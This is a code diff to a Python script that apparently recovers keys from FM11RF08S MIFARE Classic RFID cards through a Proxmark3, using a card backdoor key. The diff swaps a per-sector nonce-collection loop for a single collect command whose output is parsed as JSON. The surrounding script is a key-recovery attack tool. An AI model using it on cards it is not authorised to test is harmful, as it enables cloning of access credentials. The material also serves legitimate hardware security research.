@@ -18,6 +18,7 @@ import sys
 import time
 import subprocess
 import argparse
+import json
 import pm3
 # optional color support
 try:
@@ -101,44 +102,14 @@ if args.init_check:
                 found_keys[sec][1] = res[4]
                 print_key(sec, 1, found_keys[sec][1])
 
-nt = [["", ""] for _ in range(NUM_SECTORS)]
-nt_enc = [["", ""] for _ in range(NUM_SECTORS)]
-par_err = [["", ""] for _ in range(NUM_SECTORS)]
 print("Getting nonces...")
-for sec in range(NUM_SECTORS):
-    blk = sec * 4
-    if found_keys[sec][0] == "" or found_keys[sec][1] == "":
-        # Even if one key already found, we'll need both nt
-        for key_type in [0, 1]:
-            cmd = f"hf mf isen -n1 --blk {blk} -c {key_type+4} --key {BACKDOOR_RF08S}"
-            p.console(cmd)
-            cmd += f" --c2 {key_type}"
-            p.console(cmd)
-print("Processing traces...")
-for line in p.grabbed_output.split('\n'):
-    if "nested cmd: 64" in line or "nested cmd: 65" in line:
-        sec = int(line[24:26], 16)//4
-        key_type = int(line[21:23], 16) - 0x64
-        data = line[65:73]
-        nt[sec][key_type] = data
-    if "nested cmd: 60" in line or "nested cmd: 61" in line:
-        sec = int(line[24:26], 16)//4
-        key_type = int(line[21:23], 16) - 0x60
-        data = line[108:116]
-        nt_enc[sec][key_type] = data
-        data = line[128:136]
-        par_err[sec][key_type] = data
-
-# Check if we got all nonces, else abort.
-# TODO: retry instead...
-for sec in range(NUM_SECTORS):
-    if found_keys[sec][0] == "" or found_keys[sec][1] == "":
-        for key_type in [0, 1]:
-            if (nt[sec][key_type] == "" or
-               nt_enc[sec][key_type] == "" or
-               par_err[sec][key_type] == ""):
-                print("Error, could not collect all nonces, try again.")
-                exit()
+cmd = f"hf mf isen --collect_fm11rf08s --key {BACKDOOR_RF08S}"
+p.console(cmd)
+try:
+    nt, nt_enc, par_err = json.loads(p.grabbed_output)
+except json.decoder.JSONDecodeError:
+    print("Error getting nonces, abort.")
+    exit()
 
 if os.path.isfile(DICT_DEF_PATH):
     print(f"Loading {DICT_DEF}")
